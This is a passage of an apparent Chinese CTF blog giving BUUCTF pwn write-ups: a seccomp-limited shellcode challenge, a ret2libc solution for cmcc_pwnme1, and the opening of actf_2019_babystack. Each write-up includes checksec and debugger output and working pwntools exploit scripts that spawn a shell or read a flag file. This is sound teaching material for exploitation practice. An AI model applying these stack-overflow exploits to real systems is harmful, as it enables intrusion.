JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x08 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0010 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005 0004: 0x15 0x00 0x05 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0010 0005: 0x15 0x03 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">read</span><span class="token punctuation">)</span> goto 0009 0006: 0x15 0x02 0x00 0x00000001  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">write</span><span class="token punctuation">)</span> goto 0009 0007: 0x15 0x01 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0009 0008: 0x15 0x00 0x01 0x0000003c  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token builtin class-name">exit</span><span class="token punctuation">)</span> goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW 0010: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈可读可写可执行，<code>0x123000</code>可写可执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA             Start                End Perm     Size Offset File          0x123000           0x124000 <span class="token parameter variable">-wxp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_00123<span class="token punctuation">]</span>          0x3ff000           0x400000 rw-p     <span class="token number">1000</span>      <span class="token number">0</span> /home/starrysky/buuctf/not_bad/pwn          0x400000           0x401000 r-xp     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/buuctf/not_bad/pwn          0x600000           0x601000 r--p     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/buuctf/not_bad/pwn          0x601000           0x602000 rw-p     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/buuctf/not_bad/pwn          0x602000           0x623000 rw-p    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000      <span class="token number">0</span> /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so    0x7ffff7bcb000     0x7ffff7dcb000 ---p   <span class="token number">200000</span> 1e7000 /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so    0x7ffff7dcb000     0x7ffff7dcf000 r--p     <span class="token number">4000</span> 1e7000 /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     <span class="token number">2000</span> 1eb000 /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7dd1<span class="token punctuation">]</span>    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    <span class="token number">27000</span>      <span class="token number">0</span> /home/starrysky/buuctf/not_bad/2.27/ld-2.27.so    0x7ffff7fbb000     0x7ffff7fbe000 rw-p     <span class="token number">3000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7fbb<span class="token punctuation">]</span>    0x7ffff7fbe000     0x7ffff7fc0000 r--p     <span class="token number">2000</span>      <span class="token number">0</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1    0x7ffff7fc0000     0x7ffff7fcf000 r-xp     f000   <span class="token number">2000</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1    0x7ffff7fcf000     0x7ffff7fdd000 r--p     e000  <span class="token number">11000</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1    0x7ffff7fdd000     0x7ffff7fde000 ---p     <span class="token number">1000</span>  1f000 /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1    0x7ffff7fde000     0x7ffff7fdf000 r--p     <span class="token number">1000</span>  1f000 /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1    0x7ffff7fdf000     0x7ffff7fe0000 rw-p     <span class="token number">1000</span>  <span class="token number">20000</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1    0x7ffff7fe0000     0x7ffff7fe2000 rw-p     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7fe0<span class="token punctuation">]</span>    0x7ffff7ff6000     0x7ffff7ffa000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    0x7ffff7ffc000     0x7ffff7ffd000 r--p     <span class="token number">1000</span>  <span class="token number">27000</span> /home/starrysky/buuctf/not_bad/2.27/ld-2.27.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     <span class="token number">1000</span>  <span class="token number">28000</span> /home/starrysky/buuctf/not_bad/2.27/ld-2.27.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7ffe<span class="token punctuation">]</span>    0x7ffffffde000     0x7ffffffff000 rwxp    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>0xffffffffff600000 0xffffffffff601000 <span class="token parameter variable">--xp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的思路就是<code>ret2shellcode</code>，运行到<code>shellcode</code>的方法就是<code>jmp rsp</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not_bad  ROPgadget <span class="token parameter variable">--binary</span> pwn <span class="token parameter variable">--only</span> <span class="token string">'jmp'</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x000000000040078b <span class="token builtin class-name">:</span> jmp 0x4007700x00000000004008eb <span class="token builtin class-name">:</span> jmp 0x4008800x0000000000400b03 <span class="token builtin class-name">:</span> jmp 0x400b7a0x0000000000400b87 <span class="token builtin class-name">:</span> jmp qword ptr <span class="token punctuation">[</span>rax - 0x68000000<span class="token punctuation">]</span>0x0000000000400ceb <span class="token builtin class-name">:</span> jmp qword ptr <span class="token punctuation">[</span>rbp<span class="token punctuation">]</span>0x0000000000400865 <span class="token builtin class-name">:</span> jmp rax0x0000000000400a01 <span class="token builtin class-name">:</span> jmp rspUnique gadgets found: <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先随意填充局部变量和<code>rbp</code>，再运行到<code>jmp rsp</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; stack00:0000│ rsp 0x7fff2bc941f0 ◂— 0xc748ff3148c03148&lt;--局部变量开始位置01:0008│     0x7fff2bc941f8 ◂— 0xc2c74800123000c602:0010│     0x7fff2bc94200 ◂— 0xc748050f0000010003:0018│     0x7fff2bc94208 ◂— 0xd0ff00123000c004:0020│ rbp 0x7fff2bc94210 ◂— 0x005:0028│     0x7fff2bc94218 —▸ 0x400a01 ◂— jmp rsp06:0030│     0x7fff2bc94220 ◂— 0x480ae4ff30ec8348&lt;--跳转之后能执行的位置07:0038│     0x7fff2bc94228 —▸ 0x123000 ◂— add byte ptr [rax], al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">► 0x400a01          jmp    rsp                           <span class="token operator">&lt;</span>0x7fff2bc9422<span class="token operator"><span class="token file-descriptor important">0</span>></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入长度不够，在能执行的位置可以写入<code>shellcode</code>先扩充能执行代码空间，即<code>sub rsp, 0x20</code> <code>jmp rsp</code>,执行到局部变量内容，然后在局部变量中填入<code>shellcode</code>来再次读取，由于没开<code>pie</code>所以可以选择将<code>orw</code>读取到<code>0x123000</code>，读取之后还需要去执行<code>orw</code>，所以需要先将读取的地址赋给<code>rax</code>,接着<code>call rax</code>即可执行<code>orw</code></p><p>最终exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27338</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x0000000000400a01</span>p <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""xor rax,rax;xor rdi,rdi;mov rsi,0x123000;mov rdx,0x100;syscall;mov rax,0x123000;call rax;"""</span></span>p <span class="token operator">=</span> asm<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;jmp rsp'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a><a href="https://buuoj.cn/challenges#cmcc_pwnme1">cmcc_pwnme1</a></h2><p>这题就是一道简单的栈溢出，先检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmcc_pwnme1  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/cmcc_pwnme1/pwn'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8047000<span class="token punctuation">)</span>    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到<code>Has RWX segments</code>第一反应想到的是<code>ret2shellcode</code></p><p>程序主要内容如下：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int getfruit()&#123;  char v1[164]; &#x2F;&#x2F; [esp+14h] [ebp-A4h] BYREF  fflush(stdout);  printf(&quot;Please input the name of fruit:&quot;);  __isoc99_scanf(&quot;%s&quot;, v1);  return printf(&quot;oh,%s...\n&quot;, v1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中存在一个后面函数，但是<code>buuctf</code>又又又又改了远程的<code>flag</code>位置，所以不能直接溢出到后门</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-84h] BYREF</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+8Ch] [ebp-Ch]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Yeah, you got it..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"/home/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试写<code>shellcode</code>，先查看可执行段在哪</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA     Start        End Perm     Size Offset File 0x8047000  0x8048000 rw-p     <span class="token number">1000</span>      <span class="token number">0</span> /home/starrysky/buuctf/cmcc_pwnme1/pwn 0x8048000  0x8049000 r-xp     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/buuctf/cmcc_pwnme1/pwn 0x8049000  0x804a000 r--p     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/buuctf/cmcc_pwnme1/pwn 0x804a000  0x804b000 rw-p     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/buuctf/cmcc_pwnme1/pwn0xf7e15000 0xf7fc2000 r-xp   1ad000      <span class="token number">0</span> /home/starrysky/buuctf/cmcc_pwnme1/libc-2.23.so0xf7fc2000 0xf7fc3000 ---p     <span class="token number">1000</span> 1ad000 /home/starrysky/buuctf/cmcc_pwnme1/libc-2.23.so0xf7fc3000 0xf7fc5000 r--p     <span class="token number">2000</span> 1ad000 /home/starrysky/buuctf/cmcc_pwnme1/libc-2.23.so0xf7fc5000 0xf7fc6000 rw-p     <span class="token number">1000</span> 1af000 /home/starrysky/buuctf/cmcc_pwnme1/libc-2.23.so0xf7fc6000 0xf7fcb000 rw-p     <span class="token number">5000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_f7fc6<span class="token punctuation">]</span>0xf7fcb000 0xf7fcf000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>0xf7fcf000 0xf7fd1000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>0xf7fd1000 0xf7fd2000 r--p     <span class="token number">1000</span>      <span class="token number">0</span> /usr/lib/i386-linux-gnu/ld-2.31.so0xf7fd2000 0xf7ff0000 r-xp    1e000   <span class="token number">1000</span> /usr/lib/i386-linux-gnu/ld-2.31.so0xf7ff0000 0xf7ffb000 r--p     b000  1f000 /usr/lib/i386-linux-gnu/ld-2.31.so0xf7ffc000 0xf7ffd000 r--p     <span class="token number">1000</span>  2a000 /usr/lib/i386-linux-gnu/ld-2.31.so0xf7ffd000 0xf7ffe000 rw-p     <span class="token number">1000</span>  2b000 /usr/lib/i386-linux-gnu/ld-2.31.so0xfffdd000 0xffffe000 rwxp    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现和上一题一样，可执行段在栈上，现在最主要的就是如何控制程序流去执行到栈，但是通过各种尝试最后发现要获取栈地址只能通过<code>libc</code>，那不如直接<code>ret2libc</code>，最后本题还是用了<code>ret2libc</code>得解（好气想了半天怎么执行到<code>shellcode</code></p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27029</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>ret <span class="token operator">=</span> <span class="token number">0x08048476</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xa4</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xa4</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xa4</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a><a href="https://buuoj.cn/challenges#actf_2019_babystack">actf_2019_babystack</a></h2><p><code>64</code>位的栈题，开了堆栈不可执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">actf_2019_babystack  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/actf_2019_babystack/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fe000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序也很简单，读取指定的长度内容到栈上，且输出变量地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to ACTF's babystack!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many bytes of your message?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">0x3E</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> len <span class="token operator">&lt;=</span> <span class="token number">224</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your message will be saved at %p\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What is the content of your message?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Byebye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是<code>get_len</code>函数限制了不能使用整型溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sub_400A1A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token 